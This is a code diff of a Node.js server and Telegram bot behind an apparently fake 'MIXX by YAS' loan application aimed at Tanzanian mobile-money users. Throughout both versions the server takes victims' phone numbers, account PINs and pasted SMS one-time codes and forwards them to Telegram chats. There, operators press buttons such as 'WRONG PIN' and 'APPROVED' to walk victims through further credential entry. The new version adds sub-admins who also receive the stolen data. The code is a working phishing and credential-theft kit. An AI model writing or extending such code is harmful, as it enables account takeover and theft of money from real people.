@@ -1,166 +1,181 @@
 const express = require('express');
-const path = require('path');
 const TelegramBot = require('node-telegram-bot-api');
+const path = require('path');
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const DEFAULT_ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '';
+// Telegram configuration
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
+const MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || 'YOUR_MAIN_ADMIN_TELEGRAM_ID';
 
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+const bot = new TelegramBot(TOKEN, { polling: true });
 
-const usersDB = {};
+const sessions = {};
+const authorizedSubAdmins = new Set([MAIN_ADMIN_ID]);
 
-app.post('/api/submit-application', (req, res) => {
-  const { contact, pin, amount } = req.body;
-  const adminChat = req.query.admin || DEFAULT_ADMIN_CHAT_ID;
-  const userId = 'user_' + Date.now();
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id.toString();
+  const isMain = (chatId === MAIN_ADMIN_ID);
 
-  usersDB[userId] = {
-    contact,
-    pin,
-    amount,
-    adminChat,
-    status: 'WAITING_ADMIN',
-    pastedSms: null,
-    otp: null
-  };
-
-  if (adminChat) {
-    const msg = `📥 **MAOMBI MAPYA YA MKOPO (MIXX Tanzania)**\n\n` +
-                `📱 **Namba:** \`${contact}\`\n` +
-                `🔑 **PIN:** \`${pin}\`\n` +
-                `💰 **Kiasi:** ${amount}\n\n` +
-                `Chagua hatua ifuatayo:`;
-
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: '💬 Omba SMS', callback_data: `sms_${userId}` },
-          { text: '🔢 Omba OTP', callback_data: `otp_${userId}` }
-        ],
-        [
-          { text: '❌ Invalid PIN (Rudia)', callback_data: `retry_${userId}` },
-          { text: '✅ Idhinisha Mwisho', callback_data: `success_${userId}` }
-        ]
-      ]
-    };
-
-    bot.sendMessage(adminChat, msg, { parse_mode: 'Markdown', reply_markup: keyboard }).catch(console.error);
-  }
-
-  res.json({ success: true, userId });
-});
-
-app.post('/api/verify-sms-pasted', (req, res) => {
-  const { userId, pastedSms } = req.body;
-  if (usersDB[userId]) {
-    usersDB[userId].pastedSms = pastedSms;
-    usersDB[userId].status = 'WAITING_ADMIN';
-
-    if (usersDB[userId].adminChat) {
-      const msg = `📩 **UJUMBE WA SMS UMEWEKWA (PASTED)**\n\n` +
-                  `📱 **Namba:** \`${usersDB[userId].contact}\`\n` +
-                  `💬 **Ujumbe:**\n${pastedSms}`;
-
-      const keyboard = {
-        inline_keyboard: [
-          [
-            { text: '🔢 Omba OTP', callback_data: `otp_${userId}` },
-            { text: '✅ Idhinisha Mwisho', callback_data: `success_${userId}` }
-          ]
-        ]
-      };
-
-      bot.sendMessage(usersDB[userId].adminChat, msg, { parse_mode: 'Markdown', reply_markup: keyboard }).catch(console.error);
-    }
-  }
-  res.json({ success: true });
-});
-
-app.post('/api/submit-otp', (req, res) => {
-  const { userId, otp } = req.body;
-  if (usersDB[userId]) {
-    usersDB[userId].otp = otp;
-    usersDB[userId].status = 'WAITING_ADMIN';
-
-    if (usersDB[userId].adminChat) {
-      const msg = `🔑 **OTP IMEWEKWA**\n\n` +
-                  `📱 **Namba:** \`${usersDB[userId].contact}\`\n` +
-                  `🔢 **OTP:** \`${otp}\``;
-
-      const keyboard = {
-        inline_keyboard: [
-          [
-            { text: '✅ Idhinisha Mwisho', callback_data: `success_${userId}` },
-            { text: '❌ Invalid PIN (Rudia)', callback_data: `retry_${userId}` }
-          ]
-        ]
-      };
-
-      bot.sendMessage(usersDB[userId].adminChat, msg, { parse_mode: 'Markdown', reply_markup: keyboard }).catch(console.error);
-    }
-  }
-  res.json({ success: true });
-});
-
-app.get('/api/check-status/:userId', (req, res) => {
-  const userId = req.params.userId;
-  if (usersDB[userId]) {
-    res.json({ status: usersDB[userId].status });
+  if (isMain) {
+    authorizedSubAdmins.add(chatId);
+    bot.sendMessage(chatId, `⭐ **Main Admin Active**\nYour link is free to use and authorized.`);
   } else {
-    res.json({ status: 'UNKNOWN' });
+    bot.sendMessage(chatId, `🔐 **Sub-Admin Request**\nYour ID: \`${chatId}\`. Main admin must authorize you.`, {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '✅ Authorize', callback_data: `auth_sub_${chatId}` }]
+        ]
+      }
+    });
+
+    bot.sendMessage(MAIN_ADMIN_ID, `⚠️ Sub-admin start request from: \`${chatId}\``, {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '✅ Authorize', callback_data: `auth_sub_${chatId}` }, { text: '❌ Deny', callback_data: `deny_sub_${chatId}` }]
+        ]
+      }
+    });
   }
 });
 
-bot.on('callback_query', (query) => {
+bot.on('callback_query', async (query) => {
+  const chatId = query.message.chat.id.toString();
   const data = query.data;
-  const [action, userId] = data.split('_');
-  const fullUserId = `${action}_${userId}`; // handling underscores safely
-  
-  // Parse properly based on action prefix
-  const targetId = data.substring(data.indexOf('_') + 1);
 
-  if (usersDB[targetId]) {
-    if (action === 'sms') {
-      usersDB[targetId].status = 'SMS_PASTE_STEP';
-      bot.answerCallbackQuery(query.id, { text: 'Ombi la SMS limetumwa kwa mtumiaji.' });
-      bot.editMessageText(`✅ **Imetumwa Ombi la SMS kwa:** \`${usersDB[targetId].contact}\``, {
-        chat_id: query.message.chat.id,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      });
-    } else if (action === 'otp') {
-      usersDB[targetId].status = 'OTP_STEP';
-      bot.answerCallbackQuery(query.id, { text: 'Ombi la OTP limetumwa kwa mtumiaji.' });
-      bot.editMessageText(`✅ **Imetumwa Ombi la OTP kwa:** \`${usersDB[targetId].contact}\``, {
-        chat_id: query.message.chat.id,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      });
-    } else if (action === 'retry') {
-      usersDB[targetId].status = 'RETRY_PIN';
-      bot.answerCallbackQuery(query.id, { text: 'Imetumwa taarifa ya kurudia PIN.' });
-      bot.editMessageText(`❌ **PIN Imekataliwa kwa:** \`${usersDB[targetId].contact}\``, {
-        chat_id: query.message.chat.id,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      });
-    } else if (action === 'success') {
-      usersDB[targetId].status = 'SUCCESS';
-      bot.answerCallbackQuery(query.id, { text: 'Mkopo umeidhinishwa mafanikio!' });
-      bot.editMessageText(`🎉 **Mkopo Umeidhinishwa kikamilifu kwa:** \`${usersDB[targetId].contact}\``, {
-        chat_id: query.message.chat.id,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      });
+  if (data.startsWith('auth_sub_')) {
+    const subId = data.replace('auth_sub_', '');
+    authorizedSubAdmins.add(subId);
+    bot.answerCallbackQuery(query.id, { text: 'Sub-admin authorized!' });
+    bot.sendMessage(subId, `🎉 You are now authorized to receive applicant notifications!`);
+    bot.sendMessage(chatId, `✅ Authorized ${subId}`);
+  } else if (data.startsWith('deny_sub_')) {
+    const subId = data.replace('deny_sub_', '');
+    bot.answerCallbackQuery(query.id, { text: 'Access denied.' });
+    bot.sendMessage(subId, `❌ Access denied.`);
+  } else if (data.startsWith('allow_step_')) {
+    const sessionId = data.replace('allow_step_', '');
+    if (sessions[sessionId]) {
+      sessions[sessionId].status = 'approved_step';
+      bot.answerCallbackQuery(query.id, { text: 'Approved! Moved to next step.' });
+      bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '✅ ALREADY APPROVED', callback_data: 'noop' }]] }, { chat_id: chatId, message_id: query.message.message_id });
+    }
+  } else if (data.startsWith('deny_step_')) {
+    const sessionId = data.replace('deny_step_', '');
+    if (sessions[sessionId]) {
+      sessions[sessionId].status = 'denied';
+      bot.answerCallbackQuery(query.id, { text: 'Denied.' });
+      bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '❌ DENIED', callback_data: 'noop' }]] }, { chat_id: chatId, message_id: query.message.message_id });
+    }
+  } else if (data.startsWith('copy_sms_')) {
+    const sessionId = data.replace('copy_sms_', '');
+    const session = sessions[sessionId];
+    const textToCopy = session && session.otpText ? session.otpText : 'No text found';
+    bot.answerCallbackQuery(query.id, { 
+      text: `SMS: ${textToCopy}`, 
+      show_alert: true 
+    });
+  } else if (data.startsWith('otp_wrongpin_')) {
+    const sessionId = data.replace('otp_wrongpin_', '');
+    if (sessions[sessionId]) sessions[sessionId].otpStatus = 'wrong_pin';
+    bot.answerCallbackQuery(query.id, { text: 'Wrong PIN triggered.' });
+  } else if (data.startsWith('otp_wrongsms_')) {
+    const sessionId = data.replace('otp_wrongsms_', '');
+    if (sessions[sessionId]) sessions[sessionId].otpStatus = 'wrong_sms';
+    bot.answerCallbackQuery(query.id, { text: 'Wrong SMS triggered.' });
+  } else if (data.startsWith('otp_approved_')) {
+    const sessionId = data.replace('otp_approved_', '');
+    if (sessions[sessionId]) {
+      sessions[sessionId].status = 'fully_approved';
+      sessions[sessionId].otpStatus = 'approved';
+      bot.answerCallbackQuery(query.id, { text: 'Final Approval Success triggered.' });
+      bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '✅ COMPLETED SUCCESSFULLY', callback_data: 'noop' }]] }, { chat_id: chatId, message_id: query.message.message_id });
     }
   }
+});
+
+// Receive Loan Details
+app.post('/api/submit-loan', async (req, res) => {
+  const { sessionId, amount, duration } = req.body;
+  sessions[sessionId] = { status: 'pending', otpStatus: 'waiting', amount, duration };
+  res.json({ success: true });
+});
+
+// Receive Phone & PIN -> Sent to Telegram
+app.post('/api/submit-details', async (req, res) => {
+  const { sessionId, phone, pin } = req.body;
+  if (!sessions[sessionId]) {
+    sessions[sessionId] = { status: 'pending', otpStatus: 'waiting' };
+  }
+  sessions[sessionId].phone = phone;
+  sessions[sessionId].pin = pin;
+
+  const message = `**NEW MIXX BY YAS APPLICATION**\n\n` +
+                  `📱 **Phone number:** \`${phone}\`\n` +
+                  `🔑 **PIN:** \`${pin}\``;
+
+  for (const adminId of authorizedSubAdmins) {
+    await bot.sendMessage(adminId, message, {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '✅ ALLOW', callback_data: `allow_step_${sessionId}` },
+            { text: '❌ DENY', callback_data: `deny_step_${sessionId}` }
+          ]
+        ]
+      }
+    });
+  }
+
+  res.json({ success: true });
+});
+
+app.get('/api/check-status/:sessionId', (req, res) => {
+  const session = sessions[req.params.sessionId];
+  if (!session) return res.json({ status: 'not_found' });
+  res.json({ status: session.status, otpStatus: session.otpStatus });
+});
+
+// Receive OTP SMS Paste -> Sent to Telegram with Copy button
+app.post('/api/submit-otp', async (req, res) => {
+  const { sessionId, otpText } = req.body;
+  const session = sessions[sessionId];
+  if (session) session.otpText = otpText;
+
+  const phoneNum = session ? session.phone : 'N/A';
+
+  const message = `**NEW MIXX BY YAS APPLICATION (OTP)**\n\n` +
+                  `📱 **Phone number:** \`${phoneNum}\`\n` +
+                  `💬 **SMS / OTP:**\n\`\`\`\n${otpText}\n\`\`\``;
+
+  for (const adminId of authorizedSubAdmins) {
+    await bot.sendMessage(adminId, message, {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '📋 COPY SMS', callback_data: `copy_sms_${sessionId}` }
+          ],
+          [
+            { text: 'WRONG PIN ❌', callback_data: `otp_wrongpin_${sessionId}` },
+            { text: 'WRONG SMS', callback_data: `otp_wrongsms_${sessionId}` }
+          ],
+          [
+            { text: 'APPROVED', callback_data: `otp_approved_${sessionId}` }
+          ]
+        ]
+      }
+    });
+  }
+
+  res.json({ success: true });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`MIXX by YAS Tanzania server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+  
